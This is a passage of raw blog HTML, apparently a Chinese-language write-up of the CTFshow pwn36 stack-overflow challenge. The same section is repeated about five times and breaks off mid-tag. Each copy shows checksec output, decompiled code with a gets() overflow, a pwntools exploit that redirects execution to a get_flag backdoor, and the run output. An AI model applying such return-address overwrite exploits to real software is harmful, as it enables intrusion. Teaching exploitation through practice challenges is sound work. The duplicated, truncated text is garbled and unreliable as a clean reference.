<span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-15"><a href="#pwn36-15" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-16"><a href="#pwn36-16" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-17"><a href="#pwn36-17" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./pwn&#x27;: pid 872</span><br><span class="line">[*] &#x27;/CTFshow_pwn/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor functions here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-18"><a href="#pwn36-18" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><p>还在程序中找到了get_flag函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn36-19"><a href="#pwn36-19" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span 